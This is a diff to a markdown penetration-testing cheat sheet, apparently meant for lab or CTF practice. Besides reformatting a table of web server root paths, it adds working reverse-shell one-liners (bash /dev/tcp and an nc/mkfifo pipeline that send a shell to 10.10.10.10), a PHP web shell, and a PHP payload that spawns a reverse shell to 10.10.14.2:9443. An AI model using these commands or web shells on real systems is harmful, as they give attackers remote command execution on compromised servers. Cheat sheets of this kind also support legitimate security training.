@@ -109,11 +109,11 @@
 
 ### 📂 Common Webroots
 
-|Server|Path|
-|---|---|
-|Apache|`/var/www/html/`|
-|Nginx|`/usr/local/nginx/html/`|
-|IIS|`C:\inetpub\wwwroot\`|
+| Server | Path                     |
+| ------ | ------------------------ |
+| Apache | `/var/www/html/`         |
+| Nginx  | `/usr/local/nginx/html/` |
+| IIS    | `C:\inetpub\wwwroot\`    |
 
 ### 🌍 Usage
 
@@ -184,7 +184,19 @@ stty rows <r> columns <c>
 #bash
 |`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`|Send a reverse shell from the remote server|
 
-|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`|Another command to send a reverse shell from the remote server|
+|`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 1234 > /tmp/f`|Another command to send a reverse shell from the remote server|
+
+>[TIP]
+>```
+<?php system('id'); ?>
+```
+above shell is a web shell a reverse shell can occupy the place of id while host system is listening
+
+e.g
+
+```
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
+```
 
 
 #powershell
